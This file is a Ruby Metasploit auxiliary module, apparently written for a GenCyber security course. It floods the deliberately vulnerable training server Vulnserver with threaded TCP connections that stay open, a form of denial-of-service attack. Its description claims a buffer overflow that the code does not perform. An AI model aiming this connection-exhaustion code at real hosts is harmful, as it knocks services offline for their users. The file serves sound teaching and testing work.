require 'socket'                              # Include the socket library to gain TCP/IP functionality

class MetasploitModule < Msf::Auxiliary       # We inherit from  Msf::Auxiliary as it will use functonality provided and will be consided a DoS module
    include Msf::Auxiliary::Dos               # Although this is a DDoS it is a form of a DOS Module as metasploit has no DDoS modules.
    Rank = NormalRanking                      # We set the ranking to normal for simplicity. This is the potential success and impact to the target

def initialize(info = {})
    super(update_info(info,                    # Calls parent class update_info function and updates values used by, and describing this module
        'Name'           => 'Vulnserver DDoS', # Name of the module
        'Description'    => %q{                
            Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
        },                                     # Description of the module
        'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author(s) name(s)
        'License'        => MSF_LICENSE,       # License this is distributed under
        'References'     =>	
        [
            [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],                                     # References for the vulnerability or exploit
        'Privileged'     => false,             # Extra privlages will not be gained, and are not needed to execute this module
        'DisclosureDate' => 'Mar. 30, 2022'))  # When the vulnerability was disclosed in public
        register_options(
        [
            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]),                   # Creates Datastore object ThreadNum to control the number of threads to create
            OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),  # Creates Datastore object RHOST to control the target IP address
            OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])             # Creates Datastore object RPORT to control the port number to connect to 
        ])
    end

    def startExploit                            # Function threads use to connect and then stay connected to the server 
        print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")
        s = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server
        #connect #connect to target using values stored in datastore
        while(1)
            s.gets # Read the response from the server
        end
    end

    def run	# Actual code the module will run, since this is a Auxiliary Module, this is a run function, type run to execute in the Metasploit console
        for x in 1..datastore['ThreadNum'] do
                Thread.new{startExploit()} # Run startExploit for each thread
                print_status("Connecting on thread #{x}")
            end
        print_status("Finished sending messages")

    end
end
